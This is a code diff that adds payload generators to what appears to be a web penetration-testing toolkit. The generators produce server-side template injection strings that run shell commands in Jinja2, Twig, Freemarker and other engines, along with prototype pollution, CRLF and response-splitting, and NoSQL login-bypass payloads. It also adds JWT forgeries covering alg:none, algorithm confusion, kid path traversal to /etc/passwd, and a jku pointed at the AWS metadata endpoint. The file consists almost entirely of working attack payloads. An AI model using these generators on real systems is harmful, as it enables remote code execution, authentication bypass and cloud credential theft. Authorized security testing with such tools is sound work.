@@ -546,3 +546,385 @@ def load_php_extension_bypasses(basename: str = "shell") -> List[str]:
         ".php_.jpg",     # underscore (raro pero documentado)
     ]
     return [basename + ext for ext in exts]
+
+
+# ---------------------------------------------------------------------------
+# 5. SSTI payload variants (multi-engine)
+# ---------------------------------------------------------------------------
+
+def load_ssti_rce_payloads(cmd: str = "id") -> List[tuple]:
+    """Genera payloads SSTI que ejecutan `cmd` para los motores mas comunes.
+
+    Retorna lista de (engine_label, payload) ordenada de mayor a menor
+    compatibilidad. Cada payload intenta ejecutar `cmd` en el servidor.
+
+    Engines cubiertos:
+      - Jinja2 (Python): config.__class__ globals gadget, selectattr Popen
+      - Twig (PHP): _self.env + filter callback, map('system')
+      - Smarty (PHP): {php} tag (< 3.1.33), {system(...)} via block
+      - Freemarker (Java): ?interpret, ?eval
+      - Velocity (Java): #set($r=$Runtime.exec(...))
+      - Pebble (Java): {{"..."["class"].forName(...)}}
+      - Mako (Python): <%! import os %> ${os.popen(cmd).read()}
+      - Tornado (Python): {% import os %}{{ os.popen(cmd).read() }}
+    """
+    cmd_safe = cmd.replace("'", "\\'").replace('"', '\\"')
+    payloads: List[tuple] = []
+
+    # --- Jinja2 / Flask ---
+    payloads += [
+        ("jinja2_config_globals",
+         "{{config.__class__.__init__.__globals__['os'].popen('" + cmd_safe + "').read()}}"),
+        ("jinja2_request_globals",
+         "{{request.application.__globals__.__builtins__.__import__('os').popen('" + cmd_safe + "').read()}}"),
+        ("jinja2_selectattr_popen",
+         "{{''.__class__.__mro__[1].__subclasses__()"
+         "|selectattr('__init__.__globals__','defined')"
+         "|map(attribute='__init__.__globals__')"
+         "|selectattr('popen','defined')"
+         "|map(attribute='popen')|first('" + cmd_safe + "')}}"),
+        # lipsum builtin available in all Jinja2 environments
+        ("jinja2_lipsum",
+         "{{lipsum.__globals__['os'].popen('" + cmd_safe + "').read()}}"),
+        # cycler builtin
+        ("jinja2_cycler",
+         "{{cycler.__init__.__globals__['os'].popen('" + cmd_safe + "').read()}}"),
+    ]
+
+    # --- Twig (PHP) ---
+    payloads += [
+        ("twig_map_system",
+         "{{['" + cmd_safe + "']|map('system')|join}}"),
+        ("twig_self_exec",
+         "{{_self.env.registerUndefinedFilterCallback('exec')}}"
+         "{{_self.env.getFilter('" + cmd_safe + "')}}"),
+        ("twig_self_displayBlock",
+         "{{_self.env.registerUndefinedFilterCallback('shell_exec')}}"
+         "{{_self.env.getFilter('" + cmd_safe + "')}}"),
+        ("twig_filter_passthru",
+         "{{['" + cmd_safe + "']|filter('passthru')}}"),
+    ]
+
+    # --- Smarty (PHP) ---
+    payloads += [
+        ("smarty_php_tag",
+         "{php}echo shell_exec('" + cmd_safe + "');{/php}"),
+        ("smarty_block_system",
+         "{system('" + cmd_safe + "')}"),
+    ]
+
+    # --- Freemarker (Java) ---
+    payloads += [
+        ("freemarker_new_exec",
+         '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("' + cmd_safe + '")}'),
+        ("freemarker_objectconstruct",
+         '${product.class.forName("java.lang.Runtime").getMethod("exec","".class)'
+         '.invoke(product.class.forName("java.lang.Runtime").getMethod("getRuntime")'
+         '.invoke(null),"' + cmd_safe + '")}'),
+    ]
+
+    # --- Velocity (Java) ---
+    payloads += [
+        ("velocity_runtime",
+         '#set($str=$class.inspect("java.lang.String").type)'
+         '#set($chr=$class.inspect("java.lang.Character").type)'
+         '#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("' + cmd_safe + '"))'),
+    ]
+
+    # --- Mako (Python) ---
+    payloads += [
+        ("mako_import_os",
+         "<%!\nimport os\n%>\n${os.popen('" + cmd_safe + "').read()}"),
+    ]
+
+    # --- Tornado (Python) ---
+    payloads += [
+        ("tornado_import_os",
+         "{%% import os %%}{{ os.popen('" + cmd_safe + "').read() }}"),
+    ]
+
+    # --- Handlebars (Node.js) ---
+    payloads += [
+        ("handlebars_lookup_prototype",
+         "{{#with this as |context|}}"
+         "{{#each (lookup (lookup context '__proto__') 'process') as |v|}}"
+         "{{v}}"
+         "{{/each}}"
+         "{{/with}}"),
+    ]
+
+    return payloads
+
+
+# ---------------------------------------------------------------------------
+# 6. Prototype pollution payload path variants
+# ---------------------------------------------------------------------------
+
+def load_prototype_pollution_paths(marker: str = "polluted") -> List[dict]:
+    """Genera payloads de prototype pollution para el marker dado.
+
+    Retorna lista de dicts {path, payload_json, payload_qs} donde:
+      - path: la ruta de acceso al prototype que se intenta contaminar
+      - payload_json: body JSON equivalente
+      - payload_qs: query-string equivalente
+
+    Tecnicas cubiertas:
+      1. __proto__ directo
+      2. constructor.prototype
+      3. __proto__[key] via nested object
+      4. Unicode/encoding tricks para __proto__
+      5. Array prototype pollution
+      6. Deep merge paths (a.b.c.__proto__)
+    """
+    out = []
+
+    def _add(path: str, payload: str, qs: str) -> None:
+        out.append({"path": path, "payload_json": payload, "payload_qs": qs})
+
+    # 1. Direct __proto__
+    _add("__proto__", f'{{"__proto__": {{"{marker}": true}}}}',
+         f"__proto__[{marker}]=true")
+
+    # 2. constructor.prototype
+    _add("constructor.prototype",
+         f'{{"constructor": {{"prototype": {{"{marker}": true}}}}}}',
+         f"constructor[prototype][{marker}]=true")
+
+    # 3. __proto__ with nested key
+    _add("__proto__[key]",
+         f'{{"__proto__": {{"{marker}": "{marker}"}}}}',
+         f"__proto__[{marker}]={marker}")
+
+    # 4. Unicode bypass (__ = __)
+    _add("unicode __proto__",
+         f'{{"__proto__": {{"{marker}": true}}}}',
+         f"%5F%5Fproto%5F%5F[{marker}]=true")
+
+    # 5. Array.prototype
+    _add("[].__proto__",
+         f'{{"__proto__": {{"{marker}": true}}}}',
+         f"__proto__[{marker}]=true")
+
+    # 6. Deep path merge: a[__proto__][key]
+    _add("a.__proto__",
+         f'{{"a": {{"__proto__": {{"{marker}": true}}}}}}',
+         f"a[__proto__][{marker}]=true")
+
+    # 7. JSON with constructor key
+    _add("json_constructor",
+         f'{{"constructor": {{"prototype": {{"{marker}": true}}}}}}',
+         f"constructor%5Bprototype%5D%5B{marker}%5D=true")
+
+    return out
+
+
+# ---------------------------------------------------------------------------
+# 7. CRLF injection payloads
+# ---------------------------------------------------------------------------
+
+def load_crlf_payloads(marker: str = "injected") -> List[str]:
+    """Genera variantes de CRLF injection para inyectar header `marker: injected`.
+
+    Tecnicas cubiertas:
+      1. \r\n literal (URL encoded: %0d%0a)
+      2. \n solo (Unix-style, algunos servidores)
+      3. %0d%0a URL-encoded
+      4. Double-encoded %250d%250a
+      5. Unicode CR LF (\u000d\u000a)
+      6. Combinados con Location: redirect
+      7. Set-Cookie injection via CRLF
+      8. HTTP Response Splitting completo (doble \r\n)
+    """
+    h = f"{marker}: injected"
+    out = []
+
+    # \r\n variants
+    for crlf in ["\r\n", "\n", "%0d%0a", "%0D%0A", "%250d%250a", "%0a",
+                 "%0d", "\u000d\u000a", "\r\n\t", "%0a%20"]:
+        out.append(f"http://example.com/{crlf}{h}")
+        out.append(f"/{crlf}{h}")
+        # With Location
+        out.append(f"http://example.com/{crlf}Location: https://evil.example.com")
+        # With Set-Cookie
+        out.append(f"http://example.com/{crlf}Set-Cookie: {marker}=injected; Path=/")
+
+    # HTTP Response Splitting (injects full response)
+    for crlf in ["%0d%0a%0d%0a", "\r\n\r\n", "%0a%0a"]:
+        out.append(f"/{crlf}HTTP/1.1 200 OK{crlf}Content-Type: text/html{crlf}{crlf}<script>alert(1)</script>")
+
+    # Deduplicate preserving order
+    seen: set = set()
+    result = []
+    for p in out:
+        if p not in seen:
+            seen.add(p)
+            result.append(p)
+    return result
+
+
+# ---------------------------------------------------------------------------
+# 8. NoSQL injection operator variants
+# ---------------------------------------------------------------------------
+
+def load_nosql_operator_payloads(field: str = "password") -> List[dict]:
+    """Genera payloads de NoSQL operator injection para MongoDB/Mongoose.
+
+    Retorna lista de dicts {technique, payload_json, payload_qs} donde:
+      - technique: nombre descriptivo de la tecnica
+      - payload_json: body JSON (para POST application/json)
+      - payload_qs: query-string equivalente (para GET o POST form-encoded)
+
+    Tecnicas cubiertas:
+      1. $ne (not-equal bypass: != null)
+      2. $gt (greater-than bypass: > "")
+      3. $regex full match
+      4. $exists true (field exists regardless of value)
+      5. $where JavaScript injection (pre-4.4 MongoDB)
+      6. $in array bypass
+      7. Array-based operator injection (field[$ne]=x)
+    """
+    out = []
+
+    def _add(tech: str, j: str, qs: str) -> None:
+        out.append({"technique": tech, "payload_json": j, "payload_qs": qs})
+
+    _add("ne_null",
+         f'{{"{field}": {{"$ne": null}}}}',
+         f"{field}[$ne]=null")
+
+    _add("ne_empty_string",
+         f'{{"{field}": {{"$ne": ""}}}}',
+         f"{field}[$ne]=")
+
+    _add("gt_empty",
+         f'{{"{field}": {{"$gt": ""}}}}',
+         f"{field}[$gt]=")
+
+    _add("regex_all",
+         f'{{"{field}": {{"$regex": ".*"}}}}',
+         f"{field}[$regex]=.*")
+
+    _add("exists_true",
+         f'{{"{field}": {{"$exists": true}}}}',
+         f"{field}[$exists]=true")
+
+    _add("where_true",
+         '{"$where": "1==1"}',
+         "$where=1==1")
+
+    _add("in_array",
+         f'{{"{field}": {{"$in": ["", null, false, 0]}}}}',
+         f"{field}[$in][]=&{field}[$in][]=null")
+
+    _add("not_object",
+         f'{{"{field}": {{"$not": {{"$eq": "impossible_value"}}}}}}',
+         f"{field}[$not][$eq]=impossible_value")
+
+    return out
+
+
+# ---------------------------------------------------------------------------
+# 9. JWT tampering payloads
+# ---------------------------------------------------------------------------
+
+def load_jwt_attack_payloads(token: str, secret_guesses: List[str] = None) -> List[dict]:
+    """Genera variantes de JWT manipulado para ataques comunes.
+
+    `token`: JWT original (3 partes separadas por '.')
+    `secret_guesses`: lista de secrets a probar para HS256 bruteforce
+
+    Retorna lista de dicts {technique, token, notes}.
+
+    Tecnicas cubiertas:
+      1. alg:none — eliminar firma, algorithm=none/NONE/None
+      2. HS256→RS256 confusion — cambiar alg a RS256 (si el servidor usa clave publica como secret)
+      3. kid injection — inyectar SQL/path en el 'kid' header para leer clave desde disco/DB
+      4. jku/x5u SSRF — apuntar a clave controlada por atacante
+      5. nbf/exp manipulation — extender expiracion al maximo (exp=9999999999)
+      6. Blank secret — firmar con "" (Qwen no tiene crypto; genera estructura solamente)
+    """
+    import base64 as _b64
+    import json as _json
+
+    def _b64_decode_pad(s: str) -> bytes:
+        s += "=" * (-len(s) % 4)
+        return _b64.urlsafe_b64decode(s)
+
+    def _b64_encode(b: bytes) -> str:
+        return _b64.urlsafe_b64encode(b).rstrip(b"=").decode()
+
+    out: List[dict] = []
+    parts = (token or "").split(".")
+    if len(parts) != 3:
+        return []
+
+    try:
+        header = _json.loads(_b64_decode_pad(parts[0]))
+        payload = _json.loads(_b64_decode_pad(parts[1]))
+    except Exception:
+        return []
+
+    # 1. alg:none — remove signature
+    for none_val in ("none", "None", "NONE", "nOnE"):
+        h2 = dict(header)
+        h2["alg"] = none_val
+        new_hdr = _b64_encode(_json.dumps(h2, separators=(",", ":")).encode())
+        new_pay = parts[1]
+        # Both with and without trailing dot
+        out.append({"technique": f"alg_none_{none_val}",
+                    "token": f"{new_hdr}.{new_pay}.",
+                    "notes": "signature stripped, alg set to none variant"})
+        out.append({"technique": f"alg_none_{none_val}_nosig",
+                    "token": f"{new_hdr}.{new_pay}",
+                    "notes": "signature stripped entirely"})
+
+    # 2. RS256 confusion: change alg to RS256 (pub key used as HMAC secret)
+    h2 = dict(header)
+    h2["alg"] = "RS256"
+    new_hdr = _b64_encode(_json.dumps(h2, separators=(",", ":")).encode())
+    out.append({"technique": "rs256_confusion",
+                "token": f"{new_hdr}.{parts[1]}.{parts[2]}",
+                "notes": "alg changed to RS256 — may work if server uses pubkey as HMAC secret"})
+
+    # 3. kid injection — SQL: SELECT '' where 1=0--
+    for kid_inj in [
+        "' UNION SELECT '' --",
+        "../../dev/null",
+        "/dev/null",
+        "' OR '1'='1",
+        "../etc/passwd",
+    ]:
+        h2 = dict(header)
+        h2["kid"] = kid_inj
+        h2["alg"] = "HS256"
+        new_hdr = _b64_encode(_json.dumps(h2, separators=(",", ":")).encode())
+        out.append({"technique": f"kid_inject_{kid_inj[:20]}",
+                    "token": f"{new_hdr}.{parts[1]}.",
+                    "notes": f"kid injection: {kid_inj!r}"})
+
+    # 4. jku SSRF — point to attacker-controlled key
+    h2 = dict(header)
+    h2["jku"] = "http://169.254.169.254/latest/meta-data/"  # internal SSRF probe
+    new_hdr = _b64_encode(_json.dumps(h2, separators=(",", ":")).encode())
+    out.append({"technique": "jku_ssrf_imds",
+                "token": f"{new_hdr}.{parts[1]}.{parts[2]}",
+                "notes": "jku pointing to AWS IMDS — SSRF probe"})
+
+    # 5. exp manipulation — extend expiry to year 2286
+    p2 = dict(payload)
+    p2["exp"] = 9999999999
+    p2["nbf"] = 0
+    new_pay = _b64_encode(_json.dumps(p2, separators=(",", ":")).encode())
+    out.append({"technique": "exp_max",
+                "token": f"{parts[0]}.{new_pay}.{parts[2]}",
+                "notes": "exp extended to 9999999999 (year 2286), original signature kept"})
+
+    # 6. Blank secret — common misconfiguration (empty string HMAC)
+    h2 = dict(header)
+    h2["alg"] = "HS256"
+    new_hdr = _b64_encode(_json.dumps(h2, separators=(",", ":")).encode())
+    out.append({"technique": "blank_secret_struct",
+                "token": f"{new_hdr}.{parts[1]}.",
+                "notes": "structure for blank-secret HS256 test — caller must sign with '' HMAC"})
+
+    return out
